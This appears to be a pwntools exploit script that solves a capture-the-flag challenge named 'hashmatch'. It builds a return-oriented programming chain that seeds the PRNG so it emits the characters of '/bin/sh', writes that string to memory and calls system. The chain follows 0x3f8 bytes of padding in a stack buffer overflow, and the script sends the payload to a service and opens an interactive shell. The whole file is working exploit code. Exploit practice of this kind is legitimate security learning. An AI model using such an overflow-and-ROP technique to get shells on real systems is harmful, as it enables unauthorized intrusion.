from pwn import *

# context.log_level = 'debug'

binsh = '/bin/sh'
# copied from generate_seeds output
prng_seeds = {
    'b': 122, 'i': 58, 'n': 521, '/': 104, 's': 28, 'h': 38, 
}


e = ELF('hashmatch')
context.binary = e

rop = ROP(e)

# ROP chain: seed prng for each character in binsh, add that character to a string, then execute it
for c in binsh:
    # seed the prng
    rop.rdi = prng_seeds[c]
    rop.raw(e.sym.srand)
    # generate the "random" value
    rop.raw(e.sym.rand)
    # add the value to the string
    rop.raw(e.sym.gadget)
    rop.rdi = e.sym.data_start  # writable section of memory
    rop.raw(e.sym.add_char_to_string)  # char* rdi, int rsi
# pass the string to system
rop.rdi = e.sym.data_start
rop.raw(e.sym.gadget)  # system gets sad if rax is 0
rop.raw(e.sym.system)


# show the ROP chain we came up with
print(rop.dump())
payload = b'A' * 0x3f8 + rop.chain()  # we can see the array is 0x3f8 down the stack in Ghidra
print(payload)

# PWN
# p = process('./hashmatch')
p = remote('localhost', 5000)
# input('(attach gdb now if you desire)')
p.writeline(payload)
p.interactive()
